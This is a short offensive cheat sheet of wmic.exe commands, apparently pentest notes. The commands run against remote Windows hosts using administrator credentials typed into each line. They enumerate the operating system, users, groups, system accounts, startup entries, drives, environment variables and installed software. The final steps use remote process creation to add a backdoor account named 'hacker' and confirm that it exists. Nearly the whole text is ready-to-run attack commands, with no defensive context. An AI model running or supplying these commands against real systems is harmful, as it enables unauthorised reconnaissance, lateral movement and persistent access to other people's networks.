#### WMIC ENUM ####
# wmic to enum the local or remote neighbor machine
# Execute wmic.exe on the target machine by using the provided credentials or found; check the operating system information.
Command:  wmic /node:10.0.10.12 /user:administrator /password:password123! os list brief

# Collecting information about running target machines
Command: wmic /node:10.0.10.12 /user:administrator /password:password123! computersystem list fu

# Get all the list of groups
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! group list brief

#  Get all the user accounts list
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! useraccount list

# Get all the system accounts list
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! sysaccount list

# Get a list of all the startup program list
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! startup list full

# Get the logical disk name (drive)
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! logicaldisk get name

#  Get a list of all the environment variables.
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! environment list

# Get a list of all installed applications.
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! product get name

# Creating a dummy user.
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! process call create "net user hacker hacker_123321 /add"

# If method executed successfully, verify it by listing all the available windows users.
Command: wmic /node:10.0.20.85 /user:administrator /password:password123! useraccount list










